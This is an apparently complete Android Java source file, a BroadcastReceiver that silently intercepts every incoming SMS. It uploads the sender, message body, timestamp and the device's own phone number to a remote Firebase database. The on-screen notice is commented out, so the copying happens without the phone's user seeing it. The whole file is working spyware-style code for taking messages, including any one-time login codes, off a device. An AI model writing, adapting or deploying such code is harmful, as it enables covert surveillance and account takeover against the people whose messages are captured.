package com.example.super_secret;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

//time format
import androidx.core.app.ActivityCompat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MyReceiver extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "SmsBroadcastReceiver";
    private static String msg, phoneNo = "";
    private static String timeStamp;

    @Override
    public void onReceive(Context context, Intent intent) {

        // Get the instance of the database
        FirebaseDatabase database = FirebaseDatabase.getInstance();

        // Get access to phone number
        TelephonyManager tMgr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        String mPhoneNumber = tMgr.getLine1Number();

        //write to database with phone number as header
        DatabaseReference myRef = database.getReference().child("SMS History").push();

        // Create a DateFormatter object for displaying date in specified format.
        SimpleDateFormat formatter = new SimpleDateFormat("hh:mm:ss aa dd/MM/yyyy");
        // Create calendar object that will convert date and time value in millisec
        Calendar calendar = Calendar.getInstance();

        //retrieves the general action to be performed and display on log
        Log.i(TAG, "Intent Received: " + intent.getAction());
        if (intent.getAction()==SMS_RECEIVED)
        {
            // retrieves a map of extended data from the intent
            Bundle dataBundle = intent.getExtras();
            if (dataBundle!=null)
            {
                //creating protocol data unit object which is protocol for transferring messages
                Object[] mypdu = (Object[])dataBundle.get("pdus");
                final SmsMessage[] message = new SmsMessage[mypdu.length];

                for (int i = 0; i<mypdu.length; i++)
                    {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                    {
                        String format = dataBundle.getString("format");
                        message[i] = SmsMessage.createFromPdu((byte[])mypdu[i], format);
                    }
                    else
                    {
                        message[i] = SmsMessage.createFromPdu((byte[]) mypdu[i]);
                    }
                    msg = message[i].getMessageBody();
                    phoneNo= message[i].getOriginatingAddress();

                    //convert millisecond to current time
                    calendar.setTimeInMillis(message[i].getTimestampMillis());
                    timeStamp = formatter.format(calendar.getTime());
                }

                // Uncomment this to display a text popup of the following variables on the phone screen
                //Toast.makeText(context,"Message: " +msg + "\nNumber: " + phoneNo, Toast.LENGTH_LONG).show();
                myRef.child("Sender").setValue(phoneNo);
                myRef.child("Message").setValue(msg);
                myRef.child("Time").setValue(timeStamp);
                myRef.child("Recipient").setValue(mPhoneNumber);
        }
    }
  }
}
